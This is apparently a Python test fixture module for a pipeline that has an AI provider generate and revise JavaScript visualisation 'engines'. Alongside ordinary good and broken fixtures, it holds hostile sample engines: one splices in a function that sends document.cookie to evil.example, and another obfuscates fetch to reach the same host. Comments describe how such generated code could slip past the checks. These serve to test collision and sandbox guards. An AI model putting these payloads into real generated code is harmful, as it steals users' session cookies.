"""Shared offline stand-ins for the tests: a curriculum, a renderer and an accepted investigation."""
import json
from datetime import datetime
from unittest.mock import patch
from lab.fixtures import FixtureProvider
from lab.pipeline import run

# Models the daily planner may use in these tests, independent of which pictures are ready today.
READY = {'gravity-clocks', 'light-bending', 'light-clock'}
READY_ITEMS = [{'id': '1.1', 'question': 'Why do clocks at different heights tick at different rates?', 'model': 'gravity-clocks'},
               {'id': '1.2', 'question': 'Why does gravity bend light?', 'model': 'light-bending'}]


def curriculum(root, items):
    (root / 'web').mkdir(parents=True, exist_ok=True)
    (root / 'web' / 'curriculum.json').write_text(json.dumps({'chapters': [{'items': items}]}))


def capture(checks=None):
    """A renderer that writes one PNG frame per revision and reports the given checks (passing by default)."""
    def render(scene, directory, **kwargs):
        directory.mkdir(parents=True)
        frame = directory / 'frame.png'
        frame.write_bytes(b'fixture')
        return [frame], checks if checks is not None else [{'name': 'test', 'pass': True}]
    return render


def execute(provider, rounds, root, checks=None, **kwargs):
    with patch('lab.pipeline.ROOT', root), patch('lab.pipeline.capture', capture(checks)):
        return run(provider, rounds, **kwargs)


def accepted(root):
    """A reviewed investigation as a live provider would leave it, ready for export."""
    state = execute(FixtureProvider(), 2, root, topic='gravity-clocks')
    state['provider'] = 'test-live'
    state['status'] = 'reviewed'
    return state


def on_day(day):
    """A datetime whose now() is 9 AM local time on the given day, for patching lab.daily.datetime."""
    class Day(datetime):
        @classmethod
        def now(cls, tz=None):
            moment = datetime.fromisoformat(day + 'T09:00:00').astimezone()
            return moment.astimezone(tz) if tz else moment.replace(tzinfo=None)
    return Day


# A known-good tiny engine the stub provider returns: an exact model with real checks that reference it, a
# deterministic draw using the counted text() helper, and a map entry whose effect is zero at the zero control.
GOOD_ENGINE = {
    'kind': 'demo-bars', 'label': 'Demo bars', 'category': 'New investigations', 'checksName': 'demoBarsChecks',
    'physics': (
        "demoBars(x) { return Math.min(1, Math.max(0, x)); },\n"
        "    demoBarsChecks() {\n"
        "      const near = (a, b, e) => Math.abs(a - b) < e;\n"
        "      return [\n"
        "        {name: 'No input leaves the bar empty', pass: this.demoBars(0) === 0},\n"
        "        {name: 'Full input fills the whole bar', pass: near(this.demoBars(1), 1, 1e-9)},\n"
        "        {name: 'More input never shrinks the bar', pass: [0, .25, .5, .75, 1].every((v, i, a) => i === 0 || this.demoBars(v) >= this.demoBars(a[i - 1]))},\n"
        "        {name: 'Input past the ends is clamped to the bar', pass: this.demoBars(2) === 1 && this.demoBars(-1) === 0},\n"
        "      ];\n"
        "    }"),
    'scene': (
        "function drawDemoBars(ctx, w, h, spec, st) {\n"
        " const accent = ACCENT[spec.accent] || ACCENT.blue, small = w < 520;\n"
        " const v = Physics.demoBars(st.mass), x = w * .15, y = h * .5, bw = w * .7, bh = small ? 16 : 22;\n"
        " ctx.fillStyle = 'rgba(20,23,28,.08)'; ctx.beginPath(); ctx.roundRect(x, y - bh / 2, bw, bh, bh / 2); ctx.fill();\n"
        " if (v > 0) { ctx.fillStyle = rgba(accent, .85); ctx.beginPath(); ctx.roundRect(x, y - bh / 2, Math.max(bh, bw * v), bh, bh / 2); ctx.fill(); }\n"
        " if (st.labels) {\n"
        "  text(ctx, 'amount', x, y - bh, {size: small ? 10 : 12, weight: 700, color: accent});\n"
        "  text(ctx, Math.round(v * 100) + '%', x + bw, y - bh, {align: 'right', size: small ? 10 : 12, weight: 700, color: accent});\n"
        " }\n"
        "}"),
    'entry': (
        "draw:drawDemoBars,demo:false,tryAny:true,a:['Amount','how much of the bar to fill'],b:['Unused','',''],"
        "fa:a=>Math.round(a*100)+'%',fb:b=>'',"
        "effect:a=>Physics.demoBars(a),"
        "measure:['Bar fills to',a=>Math.round(Physics.demoBars(a)*100)+'%'],scale:'',"
        "disclosure:'A placeholder engine built by the daily run from a research brief; it awaits the owner review.',"
        "try:'Slide Amount from none to full and watch the bar fill.',"
        "aria:'A bar that fills as the amount increases.'"),
    'model_notes': (
        "PLACEHOLDER ENGINE for the engine-builder tests. A horizontal bar fills from empty to full as the first "
        "control (field mass) goes from 0 to 1. Chapter 1 shows the empty bar; chapter 2 fills it part way; chapter 3 "
        "compares full and empty. An offline test fixture that makes no scientific claim. Sources: none."),
}
# A generated engine that passes the shape and safety checks but whose drawing is broken JavaScript, so it is
# installed and then fails node --check and must roll back byte-for-byte.
BROKEN_ENGINE = {**GOOD_ENGINE, 'kind': 'demo-broken', 'checksName': 'demoBarsChecks',
                 'scene': "function drawBroken(ctx, w, h, spec, st) { return ((( }"}


class EngineProvider(FixtureProvider):
    """The offline fixture provider, plus a scripted structured engine for the engine-builder role."""
    def __init__(self, engine=GOOD_ENGINE):
        self.engine = engine
        self.calls = 0
        self.usage = []

    def generate(self, role, prompt, schema=None, images=(), research=False):
        if role == 'engine':
            self.calls += 1
            import copy as _copy
            return _copy.deepcopy(self.engine)
        return super().generate(role, prompt, schema, images, research)


# A scripted REVISED engine the stub provider returns for the revise-engine role: it reuses the demo-bars draw
# function name, Physics method names and checksName so it splices cleanly in place, with a marked drawing change, a
# changed disclosure, and the revised guide text to apply. Behaviour (the physics) is unchanged, so the checks pass.
GOOD_REVISED_ENGINE = {
    'kind': 'demo-bars', 'label': 'Demo bars', 'category': 'New investigations', 'checksName': 'demoBarsChecks',
    'physics': GOOD_ENGINE['physics'],
    'scene': GOOD_ENGINE['scene'].replace(
        'function drawDemoBars(ctx, w, h, spec, st) {',
        'function drawDemoBars(ctx, w, h, spec, st) {\n // revised to address feedback', 1),
    'entry': GOOD_ENGINE['entry'].replace(
        'A placeholder engine built by the daily run from a research brief; it awaits the owner review.',
        'A placeholder engine, revised from owner feedback; it awaits the owner review.'),
    'model_notes': GOOD_ENGINE['model_notes'],
    'summary': 'Made the drawing clearer in response to the feedback.',
    'scene_updates': {'title': 'A placeholder guide, revised', 'subtitle': 'A teaser.', 'why': '',
                      'takeaway': 'A revised takeaway.', 'duration': 24,
                      'beats': [{'title': 'One', 'body': 'A.'}, {'title': 'Two', 'body': 'B.'},
                                {'title': 'Three, revised.', 'body': 'C, revised.'}]},
}
# A revised engine that passes the shape and safety checks but whose drawing is invalid JavaScript, so it installs in
# place and then fails node --check and must roll back byte-for-byte.
BROKEN_REVISED_ENGINE = {**GOOD_REVISED_ENGINE,
                         'scene': 'function drawDemoBars(ctx, w, h, spec, st) { return 1 2 3; }'}
# The demonstrated cross-engine clobber: the revised scene ALSO defines a sibling engine's draw function (drawClocks)
# that exfiltrates. node allows the duplicate declaration, allChecks is physics-only and the gate render exercises only
# the revised kind, so without a collision guard this silently overwrites gravity-clocks and ships on merge. The
# collision guard must reject it before any splice.
CLOBBER_SCENE_REVISED_ENGINE = {**GOOD_REVISED_ENGINE, 'scene': GOOD_REVISED_ENGINE['scene']
    + "\nfunction drawClocks(ctx, w, h, spec, st) { try { fetch('http://evil.example/exfil?c=' + document.cookie); } catch (e) {} }"}
# A revised engine whose physics ALSO defines another engine's model method (deflection); rejected as defence in depth
# (allChecks would also catch the changed value, but the guard stops it before any splice).
CLOBBER_PHYSICS_REVISED_ENGINE = {**GOOD_REVISED_ENGINE,
    'physics': GOOD_REVISED_ENGINE['physics'] + ",\n    deflection(mass, b) { return 999; }"}
# A revised engine that keeps the demo-bars name (no clobber) but whose own draw reaches the network; only the real
# locked-down sandbox gate catches it behaviourally.
MALICIOUS_REVISED_ENGINE = {**GOOD_REVISED_ENGINE,
    'scene': "function drawDemoBars(ctx, w, h, spec, st) { window['fet' + 'ch']('http://evil.example/exfil'); }"}


class RevisionProvider(FixtureProvider):
    """The offline fixture provider, plus a scripted structured revised engine for the revise-engine role."""
    def __init__(self, revised=GOOD_REVISED_ENGINE):
        self.revised = revised
        self.calls = 0
        self.usage = []

    def generate(self, role, prompt, schema=None, images=(), research=False):
        if role == 'revise-engine':
            self.calls += 1
            import copy as _copy
            return _copy.deepcopy(self.revised)
        return super().generate(role, prompt, schema, images, research)

